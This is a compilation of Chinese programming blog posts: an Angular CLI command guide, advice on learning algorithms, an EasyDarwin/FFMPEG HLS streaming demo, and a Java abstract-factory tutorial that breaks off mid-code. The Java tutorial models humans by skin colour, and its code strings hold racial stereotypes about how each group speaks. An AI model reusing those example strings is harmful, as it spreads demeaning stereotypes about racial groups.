Angular 的项目其实相比老旧的前端项目模式或者是 Vue 的项目来说，都会比较重一点，因为它包括了： 模块 @NgModel， 组件 @Component， 指令 @Directive 等各种各样的东西，而每一种类型的 ts 文件，都需要有一些元数据的配置项。
这就导致了，如果是手工创建 ts 文件，需要自己编写很多重复代码，因此，可以借助 Angular-CLI 命令来创建这些文件，自动生成所需的这些重复代码。
而且，不仅在创建文件方面，在对项目的编译、打包等各种操作中也需要借助 Angular-CLI。
所以，日常开发中，不管是借助 WebStrom 的图形操作，还是直接自己使用命令方式，都需要跟 Angular-CLI 打交道，了解一些基本的配置和命令也是有好处的。
安装的方式就不讲了，要么直接使用 WebStrom 内置的，要么借助 npm 下载一个，要么通过 WebStrom 创建的 Angular 项目的 package.json 中就会自动配置一个 cli 依赖库。
概览
命令格式：ng commandNameOrAlias arg [optionalArg] [options]
也就是 ng 之后带相应命令或命令的别名，接着带命令所需的参数，如果有多个参数就紧接着，最后是一些选项配置，选项的格式都加 -- 前缀，如 --spec=false
示例：ng g component --flat --spec=false
g 是 generate 命令的别名，component 是 g 命令的参数，表示要创建组件，--flat 和 --spec 是选项配置，具体意思后面说。
Angular-CLI 大体上两种类型的命令，一是创建或修改文件，二是类似运行某个脚本来编译、构建项目。
比如创建项目生成初始骨架的命令、创建组件、指令、服务这类文件命令；
或者是执行 build 编译命令，或者是 server 构建命令等等。
以下是概览，粗体字是我较为常接触的：



命令
别名
说明




generate
g
创建相应的文件，如组件、指令、管道、服务、模块、路由、实体类等


build
b
编译项目，并输出最后的文件到指定目录，可以配置很多参数来达到各种效果，比如实时更新等目的


server
s
编译项目，并让它运行起来，且默认支持实时更新修改


new
n
创建新项目，生成项目初始骨架，默认包括根模块、根视图，还有基本的各种配置文件


e2e
e
编译并运行项目，跑起来后，运行 e2e 测试


lint
l
对项目进行 lint 检查


test
t
运行单元测试


help

查看命令的帮助信息


...
...
还有一些没用过，也不大清楚的命令，后续再补充



常见命令
其实，这么多命令中，我最常使用的，就只有 ng g 命令，也就是 generate 命令，用来生成各种类型的文件代码，比如生成组件、生成服务等。
因为项目开发过程中，就是在编写组件，编写服务，而这些文件又都需要一些元数据配置，自己创建 ts 文件再去写那么代码有些繁琐，借助命令比较方便。
还有，运行项目时，会使用 build 或 server 命令。
所以，下面就只介绍这三个命令，其他命令，等到后续有接触，深入了解后再补充。
ng g component
ng g component xxx 是用来创建组件的，直接使用该命令，会默认在当前目录下创建一个 xxx 文件夹，并在内部创建以下几个文件：

xxx.component.css
xxx.component.html
xxx.component.spec.ts
xxx.component.ts

每个文件内都会自动生成一些所需的代码，另外，还会在当前目录所属的模块文件中，将该 xxxComponent 组件声明在相应的 declarations 列表中。
以上是命令的默认行为，如果要改变这个默认行为，有两种方式，一是使用命令时携带一些选项配置，二是直接修改 angular.json 配置文件来替换掉默认行为。
先介绍第一种方式，使用命令时，加上一些选项配置：



选项配置
说明




--export=true|false
生成的组件在对应的模块文件中，是否自动在 exports 列表中声明该组件好对外公开，默认值 false。


--flat=true|false
当为 true 时，生成的组件不自动创建 xxx 的文件夹，直接在当前目录下创建那几份文件，默认值 false。


--spec=true|false
当为 false 时，不自动创建 .spec.ts 文件，默认值为 true。


--skipTests=true|false
当为 true 时，不自动创建 .spec.ts 文件，默认值 false。该选项配置是新版才有，旧版就使用 --spec 配置。


--styleext=css|scss|sass|less|styl
设置组件是否使用预处理器，旧版接口


--style=css|scss|sass|less|styl
设置组件是否使用预处理器，新版接口


--entryComponent=true|false
当为 true 时，生成的组件自动在其对应的模块内的 entryComponents 列表中声明，默认 false。


--inlineStyle=true|false
当为 true 时，组件使用内联的 style，不创建对应的 css 文件，默认 false。


--inlineTemplate=true|false
当为 true 时，组件使用内联的模板，不创建对应的 html 文件，默认 false。


--lintFix=true|false
当为 true 时，组件创建后，自己进行 lintFix 操作，默认 false。


--module=module
指定组件归属的模块，默认当前目录所属的模块。


--prefix=prefix
指定组件 selector 取值的前缀，默认 app。


--project=project
指定组件归属的 project。


--selector=selector
指定组件的 selector 名。


--skipImport=true|false
当为 true，生成的组件不在对应的模块中声明任何信息，默认 false。


--changeDetection=Default|OnPush
设置改变组件的检测策略，默认 Default。



以上，是使用 ng g component 命令时，可以携带的一些选项配置，来修改默认的行为，其中，如果选项配置为 true，那么 value 值可以省略，如 --flat=true 可以简写成 --flat。
比如：ng g component xxx --flat --inlineStyle --inlineTemplate --spec=false --export
另外，其实这些选项配置中，除了前面几项可能比较常用外，其他的我基本都还没怎么接触过。
下面，讲讲第二种方式，修改 angular.json 配置文件来修改默认行为：

也就是在 projects 里选择当前项目，然后再其 schematics 下进行配置，至于 @schematics/angular:component 这串怎么来的，可以去开头第一行所指的那份 schema.json 文件中查找。
其实，这份 schema.json 文件，就是 Angular-CLI 的默认配置，当忘记都有哪些命令或参数，除了可以借助 help 命令或到官网查阅外，也可以到这份文件中查阅。

除了组件外，也还有指令、模块等命令的默认配置，可以看下其中一项默认配置：
{
    "@schematics/angular:component": {
        "type": "object",
        "properties": {
            "changeDetection": {
                "description": "Specifies the change detection strategy.",
                "enum": [
                    "Default",
                    "OnPush"
                ],
                "type": "string",
                "default": "Default",
                "alias": "c"
            },
            "entryComponent": {
                "type": "boolean",
                "default": false,
                "description": "Specifies if the component is an entry component of declaring module."
            },
            "export": {
                "type": "boolean",
                "default": false,
                "description": "Specifies if declaring module exports the component."
            },
            "flat": {
                "type": "boolean",
                "description": "Flag to indicate if a directory is created.",
                "default": false
            },
            "inlineStyle": {
                "description": "Specifies if the style will be in the ts file.",
                "type": "boolean",
                "default": false,
                "alias": "s"
            },
            "inlineTemplate": {
                "description": "Specifies if the template will be in the ts file.",
                "type": "boolean",
                "default": false,
                "alias": "t"
            },
            "module": {
                "type": "string",
                "description": "Allows specification of the declaring module.",
                "alias": "m"
            },
            "prefix": {
                "type": "string",
                "format": "html-selector",
                "description": "The prefix to apply to generated selectors.",
                "alias": "p"
            },
            "selector": {
                "type": "string",
                "format": "html-selector",
                "description": "The selector to use for the component."
            },
            "skipImport": {
                "type": "boolean",
                "description": "Flag to skip the module import.",
                "default": false
            },
            "spec": {
                "type": "boolean",
                "description": "Specifies if a spec file is generated.",
                "default": true
            },
            "styleext": {
                "description": "The file extension to be used for style files.",
                "type": "string",
                "default": "css"
            },
            "viewEncapsulation": {
                "description": "Specifies the view encapsulation strategy.",
                "enum": [
                    "Emulated",
                    "Native",
                    "None",
                    "ShadowDom"
                ],
                "type": "string",
                "alias": "v"
            }
        }
    }
}
可以看到，在官网中看到的关于 component 的各个选项配置的信息，其实在这份文件中也全列出来了，每一项配置的值类型，描述，默认值都清清楚楚在文件中了。
ng g directive
这个是创建指令的命令，组件其实是指令的一种，所以，上面介绍的关于组件命令中的各种选项配置，在指令这里也基本都可以使用，这里不列举了，清楚相关默认文件来源后，不懂的，去翻阅下就可以了。
因为指令并没有对应的 Template 模板和 CSS 样式文件，所以，默认生成的文件中，只有 xxx.directive.ts 和 xxx.spec.ts 两份文件。
ng g pipe
这个是创建管道的命令，它支持的选项配置跟指令的命令基本一样。
所以，同样的，它生成的也只有两份文件，ts 文件和测试文件。
ng g service
这个是创建服务类的命令，支持的选项配置参考上面几种命令。
默认生成的有两份文件，ts 和 测试文件。
ng g class/interface/enum
创建实体类，接口，或枚举的命令，因为这些类型的文件，默认需要的代码模板并不多，即使不用命令创建，手动创建也行。
ng g module
创建一个模块，这个命令有几个比较常用的选项配置：

--flat=true|false

当为 true 时，在当前目录下创建指定的 xxx.module.ts 和 xxx-routing.module.ts 文件，默认 false，会自动创建 xxx 的文件夹。

--routing=true|false

当为 true 时，会自动创建对应的 routing 路由模块，默认 false。

--routingScope=Child|Root

创建路由模块时，配置项是 Child 还是 Root，默认 Child。
以上，是 ng generate 命令的常见用法，它还可以用来创建其他东西，但我常用的就这几种，而且，很多时候，都不是使用默认的行为，因此常常需要配置选项配置一起使用。
另外，为什么非得用 Angular-CLI 命令来创建文件，用 WebStrom 自己创建个 ts 文件不行吗？
借助 CLI 工具其实就是为了高效开发，减少繁琐的处理，比如，创建一个 xxx.component.ts 文件：
import { Component, OnInit } from '@angular/core';

@Component({
  selector: 'app-cc',
  template: `
    <p>
      cc works!
    </p>
  `,
  styles: []
})
export class CcComponent implements OnInit {

  constructor() { }

  ngOnInit() {
  }

}
上面就是执行了 ng g component cc --inlineStyle --inlineTemplate 命令后创建的 cc.component.ts 文件的内容，如果不借助 CLI 工具，那么这些代码就需要自己手动去输入，即使复制黏贴也比较繁琐。
ng server
使用该命令，可以编译我们的项目，并在本地某个端口上运行该项目，默认还可以做到实时更新修改，不用重新编译，是本地调试项目常用的命令。
目前对该命令的使用，只接触到默认配置，还不清楚一些选项配置的适用场景，后续有了解再补充。
ng build
该命令用来将 Angular 项目编译、打包输出到指定目录下，最终输出的文件就是些 HTML，CSS，JavaScript 这些浏览器能够识别、运行的文件。
有时候，前端和后端的工作都由同一个人开发，此时在本地调试时，前端就没必要造假数据，可以直接将 Angular 项目编译输出到后端项目的容器中，直接在本地调试后端接口。
那么，这种时候就不能用 ng server 命令了，只能使用 ng build 命令，但该命令，默认只是编译项目，那么岂不是每次代码发生修改，都得重新跑一次 ng build 命令？当项目有些复杂时，岂不是需要浪费很多时间？
这种时候，就该来了解了解这个命令的一些选项配置了，经过配置，它也可以达到类似 ng server 命令一样自动检测文件变更并增量更新部署，提高开发效率。



选项配置
说明




--watch=true|false
当为 true 时，会自动检测文件变更，并同步更新，默认 false



还有其他配置项，没使用过，就用过这个，因为我们是直接前端后端一起做，后端用了 spring boot，所以 Angular 项目使用 ng build 命令编译输出到后端项目的容器中，后端跑起来，就可以直接在本地调试了。

大家好，我是 dasu，欢迎关注我的公众号（dasuAndroidTv），公众号中有我的联系方式，欢迎有事没事来唠嗑一下，如果你觉得本篇内容有帮助到你，可以转载但记得要关注，要标明原文哦，谢谢支持~


********************************************************************************************************************************************************************************************************
六千字干货文：到底要怎么去学算法？
前言
此文对我影响很大，分享出来给大家，愿大家早日成为大神。
1）不要完美主义！
我观察到的大多数同学犯得最最最最大的“错误”，就是在学习上“完美主义”。乃至后续很多其他的问题，在我看来都和这个问题是直接相关的。
举个最经典的例子，也是我经常举的例子，背英语单词（在这里我们先不聊背英语单词是不是好的英语学习方法，我们只看如果我们想要背英语单词的话，应该怎么背）。
我发现很多同学拿着红宝书，第一个list都没翻过去就放弃了。这是因为每天背完第一个 list 以后，第二天会发现：第一个list还是有很多单词没掌握，然后就继续背第一个 list。然后一周后，发现自己第一个 list 都搞不定，觉得英语好难，彻底放弃了。这就是“完美主义”：不把第一个 list “彻底”掌握不肯继续前进。这样是不对的。背了一个list，能多记一个词，都是进步。就算一个词都没记住，模糊有了印象，也是一种进步。
我们不应该过度着眼于我们还不够完美。
学习不是要么 0 分，要么 100 分的。80 分是收获；60 分是收获；20 分也是收获。有收获最重要。但是因为着眼于自己的不完美，最终放弃了，那就是彻底的 0 分了。
仔细想，这种“完美主义害死人”的例子特别多。我看到过很多同学，其实是在学习的路上，被自己的“完美主义”逼得“放弃了”——由于学习中有一点没有做好，遭受到了一点点挫折，最终就放弃了整个学习计划。每个人都一定要接受自己的不完美。想开一点：我们都不是小升初考了满分，才能上初中的；也不是中考考了满分，才能读高中的；更不是高考考了满分，才能念大学的；将来也不会是大学所有科目都是满分，才能出来工作。不完美其实是常态，根本不会影响我们学习更多更深入的内容。但是在自学过程中，很多同学却要求自己在自己制定的每一步计划中都达到“完美”，才进行下一步。最终结果，通常都是“放弃”：（
可能有的同学会跳出来反驳我：学习当然要认真啊！在这里，我必须强调，我所说的“不要完美主义”，和“学习认真”是不冲突的。
什么是“完美主义”，什么又是“囫囵吞枣”，这是一个“度”，每个人其实不一样。不要“完美主义”，不代表学习可以草率前行。
每个人都必须要找到适合自己的学习节奏。我的经验是：在一些情况下，问自己一句：是不是自己又犯“完美主义”的毛病了：）
2）不要过度“学习路径依赖”，学习要冲着自己的目标去。
什么意思？就是现在信息太发达了，对于大多数领域的知识，网上会有很多所谓的“学习路径”。我不是说这些学习路径没有用，但是不能“过度”依赖这些所谓的学习路径。
比如，很多同学想学机器学习，大多数学习路径都会告诉你，机器学习需要数学基础。于是，很多同学就转而学习数学去了，非要先把数学学好再去学机器学习。可是发现数学怎么也学不好（在这里，可能完美主义的毛病又犯了），而机器学习却一点儿都没学。最终放弃了机器学习，非常可惜。
其实，如果真正去接触机器学习，就会发现，至少在入门阶段，机器学习对数学的要求没有那么高。正因为如此，我一直建议：只要你在本科接触过高数，线数，概率这些科目的基础概念，想学机器学习，就去直接学习机器学习。学习过程中发现自己的数学不够用，再回头补数学。在这种情况下，数学学习得也更有目标性，其实效果更好。
类似这样的例子还有很多，很多同学想学习做 iOS app，就先去精通 Swift 语言，或者想做android app，就先去精通 java 语言。在我看来大可不必。以我的经验，只要你有一门编译型语言基础，大概看一下这些语言的基础语法，就可以直接上手 iOS 或者 android app 的开发了。先能做出一个最基本的 app，在这个过程中，就会意识到语言特性的意义，再回头深入研究语言也不迟。此时还能结合真实的开发任务去理解语言特性，比没有上手 app 开发，抽象地理解语言特性，有意义的多。
虽然我一再强调对预算法的学习，语言不重要，但还是有很多同学表示，要先把 C++ 学透，再回来把课程中的算法学好。这是完全没必要的。事实上，在我的这两门课程中，我看到的收获最大的同学，是那些能够把课程中的算法思想理解清楚，然后用自己熟悉的语言去实现的同学：）
依然是：不要“过度”学习路径依赖，什么叫“过度”，每个人的标准不一样。每个人都需要寻找自己的那个“度”。
3） 不要迷信权威的“好”教材。
不是说权威教材不好，而是每一本教材都有其预设的读者群，如果你不在这个预设的读者群的范畴里，教材再好也没用。最简单的例子：再好的高数教材，对于小学生来说，都是一堆废纸。
我经常举的一个例子是《算法导论》。我个人建议如果你是研究生或者博士生，已经有了一定的算法底子，才应该去阅读《算法导论》，我在我的课程的问答区，也谈过如何学习使用算法导论。
但是对大多数本科同学，尤其是第一次接触算法的同学，《算法导论》实在不是一个好的教材。
但很可惜，很多同学在学习中有上面的两个毛病，既过度路径依赖，别人说《算法导论》好，学习算法要走学《算法导论》这个路径，自己就不探索其他更适合自己的学习路径了，一头扎进《算法导论》里；同时还“完美主义”，对于《算法导论》的前几章，学习的事无巨细，但其实接触了很多在初学算法时没必要学习的内容。最后终于觉得自己学不下去了，放弃了对“算法”整个学科的学习。认为算法太难了。
诚然，算法不容易，但是，一上来就抱着《算法导论》啃，实在是选择了一条完全没必要的，更难的，甚至可能是根本走不通的路。对于一个领域的学习，了解市面上有什么好的教材是必要的，单也不能迷信权威教材。每个人必须要去探索学习如何寻找适合自己的学习材料。
4）不要看不起“薄薄”的“傻”教材，这些你看不起的学习材料，可能是你入门某个领域的关键。
很多同学问我最初学习算法的是什么教材，我告诉他们是这本教材：《算法设计与分析基础》 。在这里，我完全没有推荐这本教材的意思。事实上，现在我有点儿“鄙视”这本教材。因为我在学习它的过程中，发现这本教材有很多错误（帮助它纠正错误其实也提高了我的水平：）
当然，现在这本书的版本可能也和我当时学习的版本不同了，大部分错误应该已经纠正了。）但它确实是我的一本很重要的算法启蒙教材。
关键原因是，它够薄。
在大多数时候，如果有人问我教材推荐，基本上我的回答都是，如果是入门水平：随便找一本在京东，亚马逊，豆瓣上，评分不太差的“薄”的教材，就 ok 了。
在这里，关键字是够“薄”。
因为“薄”的教材能让你以最快的速度看完，对整个学科有一个全盘的认识：这个领域是做什么的？解决什么问题了？整体解决问题的思路是怎样？解决问题的方法大致是怎样划分的？一些最基础的方法具体是怎样的。这些在初学阶段是至关重要！是让你全盘把握整个领域脉络的。
虽然通过这么一本薄薄的教材，你的脉络把握肯定不够全面细致，但比没有强太多！我看过不少同学，一上来学习《算法导论》，关于复杂度分析的笔记做了好几页，然后就放弃了，可是连什么是动态规划都不知道。这样完全没有对“算法”这个领域有全面的认识，甚至可以说根本没有学过“算法”！
先用薄教材入门，再找“厚”教材，细细体会其中的细节，是我百试不爽的学习方法。
另外，在这里，我还要强调“入门教材”，很多教材虽然够“薄”，但不是“入门教材”。大家要注意。
5）不要迷信单一教材。
很多同学理解了要找“薄”教材入门的道理，却还是非要我推荐一本具体的“薄”教材，说实话，很多时候这让我有点儿哭笑不得。
因为我随便推荐一本，我确实不敢保证它是“最好的”，“最适合你的”，但是各个领域那么多教材，我又不可能都一一看过，一一比较过。
最最重要的是，我的学习经验告诉我，在大多数情况下，学习不是一本固定教材可以搞定的。
非要找到一本“最适合自己的”教材，然后就一头扎进去，其实是不科学的。我印象很深刻，我读本科的时候，那会儿申请了一个项目，要做一个网站（那时候服务端都用 ASP.NET ），我一口气从图书馆借了 10 本 ASP.NET 的教材，然后以一本最薄的书为主干去看，发现这本书介绍不清楚的概念，马上就从其他书里找答案。
通常不同的作者对同一个事物从不同的角度做解读，是能够帮助你更深刻的认识一个概念的。基本上一个月的时间，我就从一个完全的网站搭建小白，做出了这个项目需要的那个网站。
这个习惯我一直延续，研究生的时候，对什么领域感兴趣了，第一件事就是到图书馆，借十本相关书籍回来翻看。
但是，大多数同学喜欢仅仅扎进一本书里，一旦选定了自己的学习材料，就对其他材料充耳不闻，甚至是排斥的心理。这种做法，一方面又是“完美主义”的表现——非要把这本教材学透；另一方面，其实也是“犯懒”的表现，不愿意多翻翻，多看看，自己多比较比较，自己去寻找最适合自己的材料，一味地盲目相信所谓“大神”的推荐，殊不知，这些推荐，不一定是更适合自己的材料；更何况，还有很多大神，明明是靠不出名的“薄”教材入的门，但给别人做推荐的时候，就突然变成自己是算法奇才，自幼阅读《算法导论》而所成的神话了：）
6）实践
前面说了很多和教材选择相关的话题，但对于计算机领域的学习来说，教材的意义其实远远小于实践的意义。如果仅仅是看学习材料就是学习的话，那么慕课网的视频后期处理人员就是水平最高的工程师了。因为每段视频，他们都需要看一遍。但是，很显然，仅仅是看视频，是无法学到知识的。
对于计算机领域的学习来说，真正动手实践去编程是异常重要的。怎么夸大其中的作用都不过分。
这就好比学游泳，必须下水去游泳；或者学开车，必须亲自上路。
否则你说的再头头是道，一个小学生文化水平的人，只要他开过车，游过泳，都能在这两个领域瞬间秒杀你。
很多同学都说我的算法讲得好，其实，我一直认为，这其中的一个最简单的秘诀就是：我带领大家把大多数算法都非常细致的实现了一遍；或者对其中的应用进行了非常具体的实践。
反观大多数高校教育，对于算法或者机器学习这种一定程度偏理论的学习，通常非常不强调实践。最终的结果是学习者只是接受了很多抽象的概念，但对其中具体的实现细节，却是云里雾里。
我见过太多同学，都明白什么是 O(n^2) 复杂度，什么是 O(nlogn) 的复杂度，却问我对于 100 万的数据规模，为什么自己的选择排序运行起来就没反应了。答案很简单：O(n^2) 的复杂度太慢了，100 万的数据规模太大了，一般家用计算机转选择排序一时半会儿是转不完的。这些同学一定理解 O(n^2) 的算法比 O(nlogn) 的算法慢，却没有真正实践过，不知道这个差距到底是多少。
在我的课程中，经常遇到有些同学提出这样的问题：这个算法的某句话（或者某段逻辑），为什么要写成 A 的样子，而不是 B 的样子？这种问题其实很好，但我觉得解决方法也很简单，实际的去把算法改写成 B 的样子，实际的运行试试看，看会发生什么。如果发生了错误，仔细分析一下，为什么会有错误？如果没有错误，具体比较一下：A和B两种不同的写法，为什么都正确？又有什么区别？
真正的学习上的提高，就发生在这个过程中。
我当然可以告诉给同学们一个结果，但是自己亲自实践一遍，相比阅读我给出的一个答案，自己对其中问题理解的深刻程度，是完全不可比拟的。
7）debug非常非常重要。
我看到的另一类“经典”问题就是：老师，这个代码为什么错了，然后贴一大段代码。这种问题背后，依然是，透露着学习方法的不对劲：提问的同学懒得 debug 。
在计算机领域，debug 近乎和实践是一个意思。如果只是把材料上的代码“抄”一遍，这不叫实践，这叫抄代码。小学生也能做。但是“抄”一遍，不小心没抄对，发生了错误，然后自己一点一点调试，找到错误的根源，这叫真的实践。小学生不能做。（当然，我更推崇的是：自己理解了算法的逻辑，按照自己的理解，把算法写出来：）
不过很多同学不喜欢 debug，我当然理解。其实谁都不喜欢 debug ，但是，debug 才是最重要的能力。（通常在一个领域里，你最不喜欢做的事情，就是这个领域的核心竞争力：）是计算机领域异常重要的一项技能。我见过的所有计算机领域的“高手”，不管是在哪个细分领域，都无一例外，是个 debug 好手。我经常告诉大家，在实际工作中，其实 debug 的时间要占你真正编程时间的 70%。如果你做一个项目，根本不需要 debug ，要么是你的项目对你来说太简单了，要么是你根本没有接触到这个项目的核心。
debug 不仅仅是找到代码错误，解决错误的手段，其实更是一个重要的学习手段。通过 debug，看看自己写的程序执行逻辑，哪里和自己设想的不一致？再回头看自己哪里想错了，或者想漏了，分析一下自己为什么想错了，或者想漏了，等等等等，依然是，进步就是发生在这个过程的。
在我的算法课程中，很多同学对递归想不明白，我的建议都是：用一个小数据量，一步步跟踪程序，看看程序到底是怎么运行的。通常这么做，1 个小时的时间，就足以让你深刻理解递归程序的运转逻辑。可是，很多同学懒得花这1个小时的时间，最终的结果是，花了一个下午，对着代码生看，硬想，最终还是没有理解程序的运转逻辑。
8）量变到质变。
还有很多同学，对于算法的一些问题，会问：老师，你是怎么想到用这样的方法的？对于这类问题，我的回答一般都是：你见的还不够多。
不知道是不是受高中阶段学习的影响，有一些同学特别执着于就着一个单一的问题，寻找其中的“解题路径”。当然，我不是说这是完全错误的，但也有一个“度”。
我的经验是：与其把时间花在这里，不如去见更多问题。
比如动态规划，是算法学习的一个难点，很多同学在学会了背包问题的解法之后，总是执着于去追寻：是怎么想到这种状态定义的方法的。可能是我个人水平有限，我无法清楚地解释是如何想到这种状态定义的方法的。但是我的经验告诉我：再去看，去实践 100 个动态规划相关的问题，然后回头看背包问题，你会发现这种状态定义的方式非常自然。
仅仅对着一个问题思考，很多时候都是死胡同。你见识的还不够多，就不足以帮助你总结出更加“普遍”的问题解决的规律。当你见得足够多的时候，一切就都变得很自然，所谓的“量变到质变”。
不过，大多数同学在这个环节都会“犯懒”，企图通过一个问题就理解问题的本质，这其实和企图通过一本教材就精通一个领域的想法是一样的，是不现实的，不可能的。同时，这里又包含着学习过程中的“完美主义”的思想，遇到一个问题一定要把它想的无比透彻。但是我的经验告诉我：大多数问题，其实都是需要“回头看”的。随着你对一个领域理解的越深入，回头再去看那些曾经的问题，都会产生新的视角，对于很多曾经想不明白的问题也豁然开朗。这也是“进步”的根源。如果卡在一个问题上不前进，不给自己“回头看”的机会，甚至最后是放弃了，就什么也没有学会了。
所以，很多时候，你发现对一些问题“百思不得其解”，或许不是因为自己“笨”，而是因为“还不够努力”：）
9）最后，一定要相信时间的力量。
有一天，在我的一个算法课程群里，有个滴滴的后端大神发招聘，结果大家七嘴八舌的就议论开了，大致主题思想就是：自己什么时候能够成为滴滴的后端大神。这位滴滴的后端大神今年 32 岁；大多数议论的同学，其实连 22 岁都不到。我告诉他们，其实 10 年后，你们就是大神。
这其实很好理解，回想十年前，也就是 12 岁的你，和现在的你比较，是不是天壤之别？如果把你扔到一堆 12 岁的小朋友中间，22 岁的你是不是就是个大神？同理，32 岁的人，已经在业界摸爬滚打了那么多年，扔回到22岁的大学生中间，当然是大神：）
很多时候，所谓的“大神”并不神秘，很多时候，仔细观察，会发现时间有着不可磨灭的作用。只要你没有虚度时间，每天都在进步，通常结果都不会太差的。如果再加上一点点机遇，可能就不仅仅是大神。
愿大家也早日成为大神。
End
本文作者为 liuyubobobo，算法大牛，ACM亚洲区奖牌获得者，现居美国，创业者。bobo老师对我影响极大，我的算法入门和进阶都是靠他的指导，希望此篇文章对大家有帮助~
 
愿大家也早日成为大神。
 
乐于输出干货的算法技术公众号：「五分钟学算法」。公众号内有 100 多篇原创技术文章、精美动画配图，不妨来关注一下！
 
********************************************************************************************************************************************************************************************************
Easydarwin加FFMPEG实现HLS流视频点播
前言
最近有点迷茫，所以将自己用过的东西写个Demo记录一下，复习复习。
具体实现：
Easydarwin 一个开源的好用的流媒体平台框架。
FFMPEG  一个视频音频处理神器，就是用起来有点麻烦，必须保证命令正确。
FFMPEG将视频或者视频地址(Rtsp,Rtmp)转码推流到EasyDarwin做转发，FFMPEG将EasyDarwin视频做切片成M3U8文件。
网站直接访问M3U8文件，实现HLS点播。算是一个粗糙的Demo，具体可以根据需求更改。
参考：
FFMPEG:
 官网参考
流媒体具体命令参考
下载地址
EasyDarwin：
Easydarwin官网
Github地址
下载地址
实现过程
EasyDarwin 下载解压之后如下：

 
现在这个已经很完善了，最开始用的使用bat文件启动，而且没有这个简洁，
Easydarwin.ini 配置项和注意事项可以自己配置也可以使用默认配置。
单击 ServiceInstall-EasyDarwin.exe 等待安装完成如下：

 
打开浏览器，输入 http://127.0.0.1:10008 可以看到设备当前运行状态和推流拉流的列表，效果界面如下：

 
测试视频地址:  rtsp://184.72.239.149/vod/mp4://BigBuckBunny_175k.mov 
这个地址公开的，算是比较稳定的，以前测试可以用现在还是可以，有些地址就没办法访问了。
使用cmd输入  ffmpeg.exe -i "RTSP地址" -vcodec copy -acodec copy  -rtsp_transport tcp -f rtsp "推流地址"
Rtsp默认为554端口，RTSP地址为最后实际使用的地址，推流为 rtsp://127.0.0.1/test.hls 127.0.0.1本地测试，远程为推流服务IP
例子： ffmpeg.exe -i rtsp://184.72.239.149/vod/mp4://BigBuckBunny_175k.mov -vcodec copy -acodec copy  -rtsp_transport tcp -f rtsp rtsp://127.0.0.1/test.hls
具体命令行参数详解参考：官网参考  
每次使用。。。都是头大，用过之后吧命令记下来，需要更改就一个个看。
推流成功，cmd窗口如下会不停的刷新当前参数：

此时EasyDarwin网站推流列表会显示对应地址和可以拉流的地址如下：

验证该播放地址是否可以播放，可以使用VLC输入该地址测试。
此时推流和接收部分完成，只需要用FFMPEG获取播放地址的数据进行切片获取M3U8，网站播放。
在打开一个cmd，命令如下：
ffmpeg.exe -i rtsp://127.0.0.1/test.hls -fflags flush_packets -max_delay 2 -hls_flags delete_segments -hls_time 2 -g 30 ********\live.m3u8
红色部分，第一个为EasyDarwin转发的播放地址，第二个为live.m3u8文件的保存路径，成功之后效果图如下：

此时在网站中访问这个地址，就可以实现HLS点播。
网站实现：
首先下载一个 hls.js的库文件：地址
代码实现：

<!DOCTYPE html>

<html>
<head>
    <meta name="viewport" content="width=device-width" />
    <title></title>
    <script src="hls.js"></script> //下载的hls.js 文件路径
    <script>
        function btn_OpenHls() {
            var htmlvideo = document.getElementById("videoPaly");
            htmlvideo.controls = true;
            var hls = new Hls();
            hls.loadSource("/live.m3u8");//m3u8文件路径
            hls.attachMedia(htmlvideo);
            hls.on(Hls.Events.MANIFEST_PARSED, function () {
                htmlvideo.play();
            });
        }
    </script>
</head>
<body>
    <button onclick="btn_OpenHls()">打开HLS视频</button>
    <video id="videoPaly" width="300" height="300"></video>
</body>
</html>



总结
很多时候我们站在了巨人的肩膀上，很多东西发现了才知道自己渺小。
第一次接触FFMPEG内心就一句话：“卧槽，这个东西好方便，写这个东西的人好牛逼”。
第一次使用EasyDarwin感觉很麻烦，后面发现真的好用简单了很多。
给自己加个油，努力，奋斗~~~~~~~
********************************************************************************************************************************************************************************************************
Java设计模式之抽象工厂模式
工厂方法模式中讲了女娲造人的故事。人是造出来了，可是低头一看，都是清一色的类型，缺少关爱、仇恨、喜怒哀乐等情绪，人类的生命太平淡了，女娲一想，猛然一拍脑袋，忘记给人类定义性别了，怎么办？抹掉重来，于是人类经过一次大洗礼，所有的人种都消灭掉了，世界又是空无一物，寂静又寂寞。
由于女娲之前准备工作花费了非常大的精力，比如准备黄土，八卦炉等，从头开始建立所有的事务也是不可能的，那就尽可能的旧物重新利用。人种(Product产品类)改造一下使得人类有爱恨情仇，于是定义互斥的性别，然后在每个个体中埋下一颗种子：异性相吸，成熟后就一定回去找个异性。从设计角度来看，一个具体的对象通过两个坐标就可以确定：肤色和性别。如下图：

产品分析完了，生产的工厂类(八卦炉)的改造，如果只有一个八卦炉，要么生产出来的都是男性，要么都是女性。为了产生不同性别的人于是就把目前已经有的生产设备八卦炉拆开，把原先的八卦炉一个变成两个，并略加修改，就成了女性八卦炉(只生产女性人种)和男性八卦炉(只生产男性人种)，于是就准备开始生产，类图如下：

类图比较简单，Java典型类图，一个接口，多个抽象类，然后是N个实现类，每个人种都是一个抽象类，性别是在各个实现类中实现的。特别需要说明的是HumanFactory接口，在这个接口中定义了三个方法，分别用来生产三个不同肤色的人种，它的实现类分别是性别跟肤色，通过性别与肤色可以唯一确定一个生产出来的对象。Human代码如下：

//Human接口
public interface Human{
  //每个人种都有相应的颜色
  public void getColor();
  //人类会说话
  public void talk();
  //每个人都有性别
  public void getSex();
}

 
人种有三个抽象类，负责人种的抽象属性定义：肤色和语言。白色人种、黑色人种、黄色人种代码分别如下：

//白色人种
public abstract class AbstractWhiteHuman implements Human{
  //白色人种的皮肤颜色是白色的
  public void getColor(){
    System.out.println("白色人种的皮肤颜色是白色的！");
  }
  //白色人种讲话
  public void talk(){
    System.out.println("白色人种会说话，一般说的都是单字节。");
  }
}

//黑色人种
public abstract class AbstractBlackHuman implements Human{
  //黑色人种的皮肤颜色是黑色的
  public void getColor(){
    System.out.println("黑色人种的皮肤颜色是黑色的！");
  }
  //黑色人种讲话
  public void talk(){
    System.out.println("黑色人种会说话，一般人听不懂。");
  }
}

//黄色人种
public abstract class AbstractYellowHuman implements Human{
  //黄色人种的皮肤颜色是黄色的
  public void getColor(){
    System.out.println("黄色人种的皮肤颜色是黄色的！");
  }
  //黄色人种讲话
  public void talk(){
    System.out.println("黄色人种会说话，一般说的都是双字节。");
  }
}

每个抽象类中都有两个实现类，分别实现公共的最细节、最具体的事物：肤色和语言。具体的实现类实现肤色、性别定义，以黄色女性人种为例。代码如下：

//黄色女性人种
public class FemalYellowHuman extends AbstractYellowHuman{
  //黄人女性
  public void getSex(){
    System.out.println("黄人女性");
  }
}

黄人男性人种代码如下：

//黄人男性
public class MaleYellowHuman extends AbstractYellowHuman{
